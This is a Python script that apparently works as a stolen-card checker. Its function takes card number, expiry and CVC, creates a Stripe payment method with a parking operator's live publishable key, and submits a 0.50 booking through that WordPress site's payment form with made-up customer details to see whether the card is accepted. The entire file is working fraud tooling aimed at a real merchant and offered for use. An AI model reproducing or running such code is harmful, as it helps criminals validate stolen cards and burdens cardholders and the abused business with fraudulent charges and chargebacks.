import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&key=pk_live_51JsxR6KI6JQjr28A4vnbJu7Ak0bZXPkSlJ8VZHZXxYVvtKsd64mQ9zdpKxs0Ul9JyMj52HpAkVIl3Rz5qlsCW07n00mj43tDyT'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': 'f8d88f49-3137-4146-8b0e-44cdc808b72c354b3f',
	    '__stripe_sid': '52dbb0cf-18f7-4190-8cfe-12d0452980b06ff767',
	}
	
	headers = {
	    'authority': 'pietrucking.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=f8d88f49-3137-4146-8b0e-44cdc808b72c354b3f; __stripe_sid=52dbb0cf-18f7-4190-8cfe-12d0452980b06ff767',
	    'origin': 'https://pietrucking.com',
	    'referer': 'https://pietrucking.com/daily-parking/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1740411932177',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=576&_fluentform_13_fluentformnonce=924066f9f9&_wp_http_referer=%2Fdaily-parking%2F&datetime=02%2F24%2F2025&numeric_field_1=1&name%5Bfirst_name%5D=Rodam&name%5Blast_name%5D=User&input_text=&phone=0817480671&email=rodamuser20%40gmail.com&dropdown=Other&input_text_21=Texla&input_text_22=Black&input_text_23=Box&terms-n-condition_1=on&terms-n-condition=on&terms-n-condition_2=on&custom-payment-amount=0.50&payment_method=stripe&hidden=0&item__13__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '13',
	}
	
	r2 = requests.post(
	    'https://pietrucking.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
